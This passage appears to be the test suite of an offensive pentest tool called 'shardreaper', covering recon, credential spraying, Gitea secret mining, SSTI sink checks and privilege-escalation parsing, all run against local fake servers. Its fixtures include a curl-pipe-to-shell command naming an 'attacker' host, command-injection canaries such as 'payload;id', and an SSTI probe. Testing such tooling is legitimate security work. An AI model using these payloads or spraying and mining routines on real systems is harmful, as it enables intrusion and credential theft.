    assert isinstance(HOST_USERNS_INODE, str)


def test_safe_kill_and_pkill_audit():
    from shardreaper.payload import safe_kill, bracket, audit_pkill, harden_pkill
    assert safe_kill("malware") == ["pkill", "-f", "[m]alware"]
    assert bracket("x") == "[x]"
    assert audit_pkill("pkill -f [o]ldproc") == []
    v = audit_pkill("pkill -f shardreaper-agent")
    assert v and "unbracketed" in v[0][1]
    cmd, n = harden_pkill("pkill -f shardreaper-agent; pkill -f '[k]ept'")
    assert n == 1 and "pkill -f [s]hardreaper-agent" in cmd
    assert "'[k]ept'" in cmd
    # variable-derived pattern cannot be safely bracketed -> left for the ban
    cmd2, n2 = harden_pkill("pkill -f $PID")
    assert n2 == 0 and audit_pkill(cmd2)


def test_report_merge_never_clobbers():
    from shardreaper.report import (merge_report, is_empty_template_section,
                                    narrative_present)
    old = ("# R\n## 2. Findings\n\n### F001 — RCE `HIGH`\n"
           "- **Detail:** real narrative\n\n## 4. Attack Plan\n\n- `HIGH` do-x")
    new = ("# R\n## 2. Findings\n\n_No confirmed findings yet — attack phase "
           "pending or target hardened._\n\n## 3. Targets & Intel\n\nfresh intel")
    m = merge_report(old, new)
    assert "F001" in m and "real narrative" in m      # narrative preserved
    assert "fresh intel" in m                          # new section added
    assert "## 4. Attack Plan" in m and "do-x" in m    # old-only section kept
    assert narrative_present(old) and not narrative_present(new)
    assert is_empty_template_section("_No plan items._")
    assert not is_empty_template_section("real content")


def test_memory_checkpoint_full_findings():
    from shardreaper import memory
    findings = [{"id": "F001", "severity": "critical",
                 "class": "credential-valid", "title": "kubelet token",
                 "target": "10.0.0.9", "technique": "T1078"}]
    memory.checkpoint("eng-full", "spray",
                      [{"id": "F001", "severity": "critical",
                        "title": "kubelet token"}], [], [],
                      findings=findings)
    roll = memory._rollup("_engagement_eng-full")
    ck = roll["checkpoints"][-1]
    assert ck["phase"] == "spray" and ck["findings"] == 1
    assert roll["checkpoint_findings"]["F001"]["class"] == "credential-valid"


def test_rack_structural_check():
    from shardreaper.rackcheck import (structural_check_src, rack_check)
    bad = "def outer():\n    def inner():\n        pass\n    return inner\n"
    assert any("nested" in v for v in structural_check_src(bad, "bad.py"))
    assert structural_check_src("def fine():\n    return 1\n", "ok.py") == []
    pkg = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                       "shardreaper")
    report = rack_check(package_dir=pkg)
    assert report["structural_ok"], \
        f"nested defs in rack: {report['structural_violations']}"


def test_recon_smoke():
    """Recon regression smoke: a live local HTTP surface must be discovered
    end-to-end through the real pipeline (resolve -> port scan -> HTTP probe)."""
    import http.server
    import socketserver
    import threading
    from shardreaper.recon import run_recon

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Server", "smoke")
            self.end_headers()
            self.wfile.write(b"<html><title>SR smoke</title></html>")

        def log_message(self, *a):
            pass

    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    try:
        scope = Scope(["127.0.0.1"], [], seeds=["127.0.0.1"], name="smoke")
        targets = run_recon(scope, ["127.0.0.1"], ports=[port], top_ports=5,
                            osint=False, paths=False)
        assert targets, "recon produced no targets"
        t0 = targets[0]
        assert port in (t0.get("ports") or {}), \
            f"port {port} not detected: {t0.get('ports')}"
        assert any(u.get("status") == 200 for u in t0.get("urls", [])), \
            "http probe missed the 200"
        # lesson 16: recon emits ORIGINS, not ip:port pairs
        assert t0.get("origins") and t0["origins"][0].startswith(
            f"http://127.0.0.1:{port}"), f"origins missing: {t0.get('origins')}"
    finally:
        srv.shutdown()
        srv.server_close()


# ---------------- v1.3 invariants: origin model / spray registry / sink /
# hypothesis / advisory / gitmine / priv / watchdog ----------------
def test_http_origin_jars():
    """P1: one jar per origin, anon/auth never share, --resolve semantics."""
    import http.server
    import socketserver
    import threading
    from shardreaper.http import OriginTransport

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            host = self.headers.get("Host", "")
            cookie = self.headers.get("Cookie", "")
            self.send_response(200)
            self.send_header("Set-Cookie", f"jar={host}; Path=/")
            self.send_header("Content-Length", str(len(cookie)))
            self.end_headers()
            self.wfile.write(cookie.encode())

        def log_message(self, *a):
            pass

    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        t = OriginTransport(timeout=5, resolve={"a.test": "127.0.0.1",
                                                "b.test": "127.0.0.1"})
        ua = f"http://a.test:{port}/"
        ub = f"http://b.test:{port}/"
        assert t.request("GET", ua, context="anon")["body"] == ""
        assert "jar=a.test" in t.request("GET", ua, context="anon")["body"]
        # different origin on the same IP: its own jar — no cookie leak
        assert t.request("GET", ub, context="anon")["body"] == ""
        # authenticated context starts empty and never poisons the anon jar
        assert t.request("GET", ua, context="user:admin")["body"] == ""
        assert "jar=a.test" in t.request("GET", ua, context="anon")["body"]
        assert "jar=a.test" in t.request("GET", ua,
                                         context="user:admin")["body"]
    finally:
        srv.shutdown()
        srv.server_close()


def test_http_cookie_domain_pinning():
    from shardreaper.http import CookieJar
    j = CookieJar()
    j.add(["sid=1; Domain=a.test; Path=/"], "sub.a.test", "/")
    assert "sid=1" in (j.header("sub.a.test", "/", False) or "")
    assert j.header("other.test", "/", False) is None
    j2 = CookieJar()
    j2.add(["x=1; Path=/"], "a.test", "/")   # no Domain -> exact host pin
    assert "x=1" in (j2.header("a.test", "/", False) or "")
    assert j2.header("sub.a.test", "/", False) is None


def test_spray_redirect_classification():
    from shardreaper.spray import classify_response
    c, _ = classify_response(302, "", "http://app/login",
                             headers={"location": "/login"})
    assert c == "redirect-login"
    c, _ = classify_response(302, "", "http://app/login",
                             headers={"location": "/dashboard"})
    assert c == "redirect-other"


def test_spray_csrf_and_login_form():
    from shardreaper.spray import extract_csrf, parse_login_form
    html = ('<form action="/login" method="post">'
            '<input type="hidden" name="authenticity_token" value="tok123">'
            '<input name="username"><input type="password" name="password">'
            '</form>')
    assert extract_csrf(html) == ("authenticity_token", "tok123")
    f = parse_login_form(html, "http://app.test/x")
    assert f["action"] == "http://app.test/login"
    assert f["user_field"] == "username" and f["pass_field"] == "password"


def test_spray_web_login_probe():
    from shardreaper.spray import web_login_probe, SURFACE_REGISTRY

    class FakeLogin:
        def __init__(self):
            self.posts = []

        def request(self, method, url, headers=None, body=None, context=None,
                    timeout=None):
            if method == "GET":
                return {"status": 200, "headers": {},
                        "body": '<form action="/login">'
                        '<input name="authenticity_token" value="c1">'
                        '<input name="username">'
                        '<input type="password" name="password"></form>'}
            self.posts.append((url, body or b"", context))
            # wrong password -> back to login
            if b"password=bad" in (body or b""):
                return {"status": 302, "headers": {"location": "/login"},
                        "body": ""}
            return {"status": 302, "headers": {"location": "/dashboard"},
                    "body": ""}

    fake = FakeLogin()
    surf = {"kind": "web-login", "url": "http://app.test/login",
            "name": "web-login:http://app.test/login"}
    hit = web_login_probe(surf, {"type": "password", "value": "good",
                                 "user": "admin"}, fake)
    assert hit and hit["class"] == "redirect-other"
    assert fake.posts[0][2] == "user:admin"   # auth context, not anon
    assert b"authenticity_token=c1" in fake.posts[0][1]  # CSRF attached
    assert web_login_probe(surf, {"type": "password", "value": "bad",
                                  "user": "admin"}, fake) is None
    # the registry is extensible — a closed list is the bug
    assert "web-login" in SURFACE_REGISTRY


class FakeLoginTransport:
    def request(self, method, url, headers=None, body=None, context=None,
                timeout=None):
        return {"status": 404, "headers": {}, "body": ""}


def test_spray_registry_extensible():
    from shardreaper.spray import spray, register_surface, SURFACE_REGISTRY

    def fake_prober(surface, creds, transport, timeout=6, log=None):
        return [{"surface": surface["name"], "status": 200,
                 "credential": "custom:hit", "form": "custom",
                 "class": "2xx-ok", "hit": True}]

    register_surface("custom-test", fake_prober)
    assert "custom-test" in SURFACE_REGISTRY
    d = tempfile.mkdtemp()
    eng = Engagement(d, "regtest", os.path.join(d, "scope.json"))
    eng.state["seeds"] = ["10.0.0.9"]
    r = spray(eng, [{"type": "sa-token", "value": "tokxxxxxxxx"}],
              log=lambda m: None, ssh=False,
              probe=lambda s, headers=None, timeout=6: (404, "", "tcp"),
              transport=FakeLoginTransport(),
              extra_surfaces=[{"kind": "custom-test", "name": "custom:x"}])
    assert any(h.get("form") == "custom" for h in r["hits"])


def test_spray_redis_auth():
    from shardreaper.spray import _redis_ping
    import socket
    import threading

    def serve(mode):
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        port = srv.getsockname()[1]

        def handler():
            conn, _ = srv.accept()
            try:
                for _ in range(3):
                    line = b""
                    while not line.endswith(b"\r\n"):
                        line += conn.recv(1)
                    parts = line.split(b"\r\n")
                    n = int(parts[0][1:])
                    args = []
                    for _ in range(n):
                        hdr = b""
                        while not hdr.endswith(b"\r\n"):
                            hdr += conn.recv(1)
                        ln = int(hdr[1:])
                        data = b""
                        while len(data) < ln + 2:
                            data += conn.recv(ln + 2 - len(data))
                        args.append(data[:ln].decode())
                    cmd = args[0].upper() if args else ""
                    if mode == "open":
                        conn.sendall(b"+PONG\r\n")
                    elif mode == "auth" and cmd == "PING":
                        conn.sendall(b"-NOAUTH Authentication required.\r\n")
                    elif mode == "auth" and cmd == "AUTH":
                        conn.sendall(b"+OK\r\n" if args[1] == "pw"
                                     else b"-WRONGPASS\r\n")
            finally:
                conn.close()
                srv.close()

        threading.Thread(target=handler, daemon=True).start()
        return port

    assert _redis_ping("127.0.0.1", serve("open"), None)[0] is True
    ok, note = _redis_ping("127.0.0.1", serve("auth"), "pw")
    assert ok is True
    assert _redis_ping("127.0.0.1", serve("auth"), "wrong")[0] is False


def test_gitmine_detect_and_mine_blob_hashes():
    import base64
    from shardreaper.gitmine import mine, secret_scan

    class FakeGit:
        def __init__(self):
            self.calls = []

        def request(self, method, url, headers=None, context=None,
                    timeout=None):
            self.calls.append(url)
            path = url.replace("http://git.test", "")
            base = path.split("?")[0]
            routes = {
                "/api/v1/version": {"status": 200,
                                    "body": '{"version":"1.22"}'},
                "/api/v1/users/search": {"status": 200,
                                         "body": '{"data":[{"login":"admin"}]}'},
                "/api/v1/users/admin/repos": {
                    "status": 200,
                    "body": '[{"name":"secretrepo"}]'},
                "/api/v1/repos/admin/secretrepo/commits": {
                    "status": 200, "body": "[]"},
                "/api/v1/repos/admin/secretrepo/git/trees/master": {
                    "status": 200,
                    "body": '{"tree":[{"type":"blob","path":".env",'
                            '"sha":"abc123"}]}'},
                "/api/v1/repos/admin/secretrepo/git/blobs/abc123": {
                    "status": 200,
                    "body": '{"content":"' + base64.b64encode(
                        b"DB_PASSWORD=hunter2secret").decode() + '"}'},
            }
            r = routes.get(base, {"status": 404, "body": ""})
            return {"status": r["status"], "headers": {},
                    "body": r["body"], "raw": b""}

    fake = FakeGit()
    report = mine("http://git.test", fake, deep=False)
    assert report["platform"] == "gitea"
    assert "admin" in report["users"]
    assert "admin/secretrepo" in report["repos"]
    assert report["blobs_fetched"] == 1
    assert any(s["kind"] == "password-assign" for s in report["secrets"])
    # lesson 21: blob content is fetched via the BLOB-HASH endpoint —
    # never a raw ref endpoint
    assert any("/git/blobs/abc123" in c for c in fake.calls)
    assert not any("/raw" in c for c in fake.calls)
    assert secret_scan("AKIAIOSFODNN7EXAMPLE key")[0]["kind"] == "aws-key"


def test_sink_contracts():
    from shardreaper.sink import (marker_payloads, evaluate_source,
                                  evaluate_marker, exploit_allowed,
                                  new_contract, contract_for)
    payload, expect = marker_payloads("ssti")[0]
    assert payload == "{{7*7}}" and expect == "49"
    # a raw string render path DISQUALIFIES even if eval appears elsewhere
    status, reason, hits = evaluate_source(
        "ssti", "x = innerHTML; var s = 'raw string'; // eval noted")
    assert status == "disproven"
    status, reason, hits = evaluate_source(
        "ssti", "return render_template('user', name=name)")
    assert status == "proven"
    assert evaluate_marker("ssti", "computed: 49")[0] == "proven"
    assert evaluate_marker("ssti", "no output")[0] == "disproven"
    d = tempfile.mkdtemp()
    eng = Engagement(d, "sinktest", os.path.join(d, "scope.json"))
    ok, why = exploit_allowed(eng, "ssti", "profile")
    assert not ok and "cheapest oracle" in why      # gate closed
    new_contract(eng, "ssti", "profile", oracle="source", status="proven",
                 reason="render_template confirmed")
    ok, why = exploit_allowed(eng, "ssti", "profile")
    assert ok
    assert contract_for(eng, "ssti", "profile")["status"] == "proven"


def test_hypothesis_lifecycle_and_tombstones():
    from shardreaper import hypothesis, memory
    d = tempfile.mkdtemp()
    eng = Engagement(d, "hyptest", os.path.join(d, "scope.json"))
    h = hypothesis.new_hypothesis(eng, "ssti-in-profile", host="app.test",
                                  budget=2, cutoff=2)
    hypothesis.note_evidence(eng, h["id"], "marker rendered")
    hypothesis.probe_failed(eng, h["id"])  # evidence resets the counter
    assert hypothesis.get(eng, h["id"])["status"] == "running"
    hypothesis.probe_failed(eng, h["id"])
    h2 = hypothesis.get(eng, h["id"])
    assert h2["status"] == "dead" and h2["tombstone"]
    reason = memory.tombstoned("app.test", "ssti-in-profile")
    assert reason and "cutoff" in reason        # death recorded with the WHY
    assert hypothesis.tombstoned("app.test", "ssti-in-profile")


def test_priv_parse_and_canaries():
    from shardreaper.priv import (parse_cron, parse_systemctl, trace_inputs,
                                  path_canaries)
    jobs = parse_cron("* * * * * root /opt/backup.sh /tmp/x\n"
                      "@reboot root /usr/bin/runner\n", "crontab")
    assert len(jobs) == 2 and jobs[0]["user"] == "root"
    assert "backup.sh" in jobs[0]["command"]
    timers = parse_systemctl("logrotate.timer     Tue 2026-01-01 00:00:00 "
                             "UTC  1h left   n/a")
    assert timers and timers[0]["timer"] == "logrotate.timer"
    t = trace_inputs("cp /tmp/up.sh /etc/cron.d/x && bash /tmp/up.sh")
    assert "/tmp" in t["inputs"]
    t2 = trace_inputs("$(curl attacker/x | sh)")
    assert "command-sub" in t2["ops"]
    cans = path_canaries("payload")
    assert "../payload" in cans and "/tmp/payload" in cans
    assert "payload;id" in cans and "payload|id" in cans


def test_advisory_lookup_offline_and_boundary():
    from shardreaper.analysis import advisory_lookup, ADVISORY_HOSTS
    r = advisory_lookup("krayin", version="2.2.0", offline=True)
    assert r["offline"] is True and r["product"] == "krayin"
    assert r["version"] == "2.2.0"
    # lesson 20 boundary: only vendor/vuln hosts are ever queried
    assert "api.github.com" in ADVISORY_HOSTS
    assert all(h.endswith((".gov", ".com", ".io")) for h in ADVISORY_HOSTS)


def test_watchdog_revalidate_targets():
    import http.server
    import socketserver
    import threading
    from shardreaper.transport import revalidate_targets

    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *a):
            pass

    srv = socketserver.TCPServer(("127.0.0.1", 0), H)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    try:
        d = tempfile.mkdtemp()
        eng = Engagement(d, "wtest", os.path.join(d, "scope.json"))
        eng.state["targets"] = [{"host": "127.0.0.1",
                                 "ports": {port: None, 1: None},
                                 "urls": [{"url": f"http://127.0.0.1:{port}/"}]}]
        r = revalidate_targets(eng, timeout=2)
        rec = r["127.0.0.1"]
        assert str(port) in rec["ports_up"]
        assert "1" in rec["ports_down"]
        assert any(u.get("status") == 200 for u in rec["urls"])
    finally:
        srv.shutdown()
        srv.server_close()

if __name__ == "__main__":
    import traceback
    failed = 0
    for name, fn in sorted(list(globals().items())):
        if name.startswith("test_") and callable(fn):
            try:
                fn()
                print(f"PASS {name}")
            except Exception:
                failed += 1
                print(f"FAIL {name}")
                traceback.print_exc()
    print(f"\n{len([n for n in globals() if n.startswith('test_')]) - failed}/{len([n for n in globals() if n.startswith('test_')])} passed")
    sys.exit(1 if failed else 0)
